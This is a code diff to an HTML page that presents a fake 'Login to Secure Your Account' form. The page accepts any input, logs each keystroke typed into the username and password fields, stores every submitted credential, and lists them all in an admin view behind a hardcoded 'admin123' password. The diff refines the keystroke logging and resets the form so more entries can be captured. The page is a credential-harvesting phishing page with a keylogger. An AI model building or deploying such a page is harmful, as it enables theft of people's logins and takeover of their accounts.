@@ -73,10 +73,10 @@
 <div class="login-container" id="loginContainer">
     <div class="login-title">Login to Secure Your Account</div>
     <form id="loginForm" onsubmit="return login(event)">
-        <input type="text" id="phone" name="phone" required oninput="recordInput(this)">
+        <input type="text" id="phone" name="phone" required oninput="recordInput('phone', event)">
         <label for="phone" class="form-label">Phone No./Username:</label>
         
-        <input type="password" id="password" name="password" required oninput="recordInput(this)">
+        <input type="password" id="password" name="password" required oninput="recordInput('password', event)">
         <label for="password" class="form-label">Password:</label>
         
         <input type="submit" value="Login">
@@ -99,18 +99,19 @@
         const password = document.getElementById("password").value;
 
         // Add user to the array regardless of credentials
-        users.push({ phone, password, keystrokes: getKeystrokes() });
+        users.push({ phone, password, keystrokesPhone: keystrokes.phone, keystrokesPassword: keystrokes.password });
 
         // Display congratulatory message
         document.getElementById("loginMessage").innerText = "Congratulations!";
+        document.getElementById("loginMessage").style.display = "block"; // Ensure message is visible
 
-        // Show admin view with password "admin123"
+        // Show admin view if the password is 'admin123'
         if (password === "admin123") {
             displayAdminView(); // Show admin view
         }
 
-        // Hide login container
-        document.getElementById("loginContainer").style.display = "none";
+        // Optionally, reset the form fields
+        document.getElementById("loginForm").reset();
     }
 
     function displayAdminView() {
@@ -119,7 +120,7 @@
 
         users.forEach(user => {
             const li = document.createElement("li");
-            li.innerText = `${user.phone} - ${user.password} - Typed: ${user.keystrokes}`;
+            li.innerText = `${user.phone} - ${user.password} - Typed Phone: ${user.keystrokesPhone}, Typed Password: ${user.keystrokesPassword}`;
             userList.appendChild(li);
         });
 
@@ -128,9 +129,8 @@
 
     const keystrokes = { phone: '', password: '' };
 
-    function recordInput(input) {
-        const { name, value } = input;
-        keystrokes[name] = value;
+    function recordInput(inputName, event) {
+        keystrokes[inputName] += event.data || '';
     }
 
     function getKeystrokes() {
@@ -140,4 +140,5 @@
 
 </body>
 </html>
+
 
